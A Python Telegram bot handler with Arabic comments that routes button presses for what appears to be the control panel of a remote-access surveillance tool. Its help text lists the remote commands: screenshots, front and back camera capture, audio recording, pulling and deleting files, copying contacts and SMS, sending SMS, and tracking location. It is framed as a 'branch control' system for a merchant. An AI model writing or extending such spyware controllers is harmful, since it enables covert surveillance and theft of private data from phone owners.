"""
معالج ضغطات الأزرار (CallbackQuery)
"""
from telegram import Update
from telegram.ext import ContextTypes

from handlers.base_handler import BaseHandler
from handlers.device_handler import DeviceHandler
from handlers.command_handler import CommandHandler
from keyboards.menu_keyboards import MenuKeyboards
from models.enums import CommandType
from utils.logger import get_logger

logger = get_logger(__name__)


class CallbackHandler(BaseHandler):
    """معالج ضغطات الأزرار."""

    def __init__(self, device_handler: DeviceHandler, command_handler: CommandHandler):
        super().__init__(device_handler.device_service, command_handler.command_service)
        self.device_handler = device_handler
        self.command_handler = command_handler

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """معالجة ضغطات الأزرار."""
        query = update.callback_query
        await query.answer()

        chat_id = update.effective_chat.id
        if not await self._check_auth(update):
            return

        data = query.data
        logger.info(f"زر مضغوط: {data} من المستخدم {chat_id}")

        # ===== قائمة الأجهزة =====
        if data == "list_devices":
            await self.device_handler.list_devices(update, context)
            return

        # ===== تحديث =====
        if data == "refresh":
            await self.device_handler.refresh_devices(update, context)
            return

        # ===== مساعدة =====
        if data == "help":
            await self._show_help(update, context)
            return

        # ===== العودة =====
        if data == "back_main":
            await self._back_to_main(update, context)
            return

        if data == "back_devices":
            await self.device_handler.back_to_devices(update, context)
            return

        # ===== إلغاء =====
        if data == "cancel_command":
            await self._cancel_command(update, context)
            return

        # ===== اختيار جهاز =====
        if data.startswith("device_"):
            device_id = data.replace("device_", "")
            await self.device_handler.show_device(update, context, device_id)
            return

        # ===== تنفيذ أمر =====
        if data.startswith("cmd_"):
            await self._handle_command_callback(update, context, data)
            return

        # ===== لا توجد أجهزة =====
        if data == "none":
            await query.answer("لا توجد أجهزة مسجلة حالياً.", show_alert=True)
            return

        # ===== غير معروف =====
        logger.warning(f"زر غير معروف: {data}")
        await query.answer("زر غير معروف", show_alert=True)

    async def _show_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """عرض رسالة المساعدة."""
        help_text = (
            "📋 **تعليمات الاستخدام:**\n\n"
            "1️⃣ **عرض الأجهزة:** اضغط على '📱 عرض الأجهزة'.\n"
            "2️⃣ **اختيار جهاز:** اضغط على اسم الجهاز.\n"
            "3️⃣ **إرسال أمر:** اختر الأمر المطلوب.\n"
            "4️⃣ **النتائج:** ستظهر مباشرة في المحادثة.\n\n"
            "🔹 **الأوامر المتاحة:**\n"
            "- 📸 تصوير شاشة\n"
            "- 🤳 كاميرا أمامية\n"
            "- 📷 كاميرا خلفية\n"
            "- 🎙️ تسجيل صوت\n"
            "- 📁 إرسال مجلد\n"
            "- 📄 إرسال ملف\n"
            "- 🗑️ حذف ملف/مجلد\n"
            "- 👥 نسخ جهات الاتصال\n"
            "- 💬 نسخ الرسائل النصية\n"
            "- 📨 إرسال رسالة نصية\n"
            "- 📊 معلومات الجهاز\n"
            "- 🔋 حالة البطارية\n"
            "- 📍 الموقع الحالي\n\n"
            "⚠️ هذا البوت مخصص للتاجر فقط."
        )
        await self._reply(
            update,
            help_text,
            reply_markup=MenuKeyboards.back_button("back_main"),
        )

    async def _back_to_main(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """العودة إلى القائمة الرئيسية."""
        devices_count = self.device_service.get_device_count()
        await self._reply(
            update,
            f"👋 **مرحباً بك في نظام التحكم بالفروع**\n\n"
            f"📱 **عدد الأجهزة المسجلة:** {devices_count}",
            reply_markup=MenuKeyboards.main_menu(devices_count),
        )

    async def _cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """إلغاء العملية المعلقة."""
        context.user_data.pop('pending_command', None)
        await self._reply(
            update,
            "✅ **تم إلغاء العملية**",
            reply_markup=MenuKeyboards.back_button("back_main"),
        )

    async def _handle_command_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE, data: str) -> None:
        """معالجة ضغط زر أمر."""
        # تحليل البيانات: cmd_{device_id}_{command}
        parts = data.split("_")
        if len(parts) < 3:
            await update.callback_query.answer("بيانات الأمر غير صالحة", show_alert=True)
            return

        device_id = parts[1]
        command_name = parts[2]

        # تحويل اسم الأمر إلى CommandType
        command_type = CommandType.from_string(command_name)
        if not command_type:
            await update.callback_query.answer(f"أمر غير معروف: {command_name}", show_alert=True)
            return

        # تنفيذ الأمر
        await self.command_handler.execute_command(
            update,
            context,
            device_id,
            command_type,
        )